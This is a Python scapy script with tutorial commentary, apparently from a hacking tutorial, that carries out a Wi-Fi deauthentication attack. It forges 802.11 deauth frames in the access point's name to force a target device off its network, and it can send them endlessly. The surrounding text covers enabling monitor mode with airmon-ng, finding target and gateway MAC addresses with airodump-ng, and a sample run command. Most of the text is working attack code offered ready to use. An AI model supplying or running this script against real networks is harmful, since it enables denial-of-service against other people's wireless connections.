'''
Enabling Monitor Mode
As in the previous sections, it’s preferred you’re running Kali
Linux, even though any Unix-based system will work. You can enable monitor mode using one of the following methods:
$ sudo ifconfig wlan0 down
$ sudo iwconfig wlan0 mode monitor

Or, preferably, using airmon-ng (requires aircrack-ng to be installed in your Unix-based machine):
$ sudo airmon-ng start wlan0
'''
from netifaces import gateways
from scapy.all import *

def deauth ( target_mac , gateway_mac , inter = 0.1 , count = None , loop = 1 , iface = "wlan0mon" , verbose = 1 ):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3 = gateway_mac )

    # stack them up
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    # send the packet
    sendp(packet, inter=inter, count=count, loop=loop, iface = iface , verbose = verbose )

'''
This time, we use the Dot11Deauth()
RadioTap() stacked on top of and our 802.11 ( Dot11 ) frame.
When sending this packet, the access point requests a deauthentication from the target; that is why we set the
destination MAC address to the target device’s MAC address and the source MAC address to the access point’s MAC address.
'''

if __name__ == "__main__":
    import argparse

    parser = argparse . ArgumentParser ( description = "A python script for sending deauthentication frames" )
    parser.add_argument("target", help="Target MAC address to deauthenticate." )
    parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with" )
    parser.add_argument("-c", "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0" , default = 0 )
    parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms" , default = 0.1 )
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0mon'" ,default = "wlan0mon" )
    parser.add_argument("-v", "--verbose", help="wether to print messages" , action = "store_true" )

    # parse the arguments
    args = parser . parse_args ()
    target = args .target
    gateway = args .gateway

    count = int ( args .count)
    interval = float ( args .interval)
    iface = args .iface
    verbose = args .verbose

    if count == 0 :
        # if count is 0, it means we loop forever (until interrupt)
        loop = 1
        count = None
    else:
        loop = 0

    # printing some info messages"
    if verbose:
        if count:
            print(f"[+] Sending { count } frames every {interval}s..." )
        else:
            print(f"[+] Sending frames every { interval } s for ever..." )

    # send the deauthentication frames
    deauth(target, gateway, interval, count, loop, iface, verbose )

'''
We’re adding various arguments to our parser: the target MAC address to deauthenticate.
the gateway MAC address with which the target is authenticated, usually the access point.
the number of deauthentication frames to send, specifying 0, will send infinitely until the script is interrupted.
The sending frequency between two frames sent in seconds. interface name to use, must be in monitor mode to work.
whether to print messages during the attack.
'''

'''
Running the Code
Now you're maybe wondering, how can we get the gateway and
target MAC address if we're not connected to that network? That
is a good question. When you set your network card into
monitor mode, you can sniff packets in the air using this
command in Linux (when you install aircrack-ng ):
$ airodump-ng wlan 0 mon

$ python scapy_deauth.py ea:de:ad:be:ef:ff 68:ff:7b:b7:83:be -wlan0mon -v -c 100 --interval 0.1
'''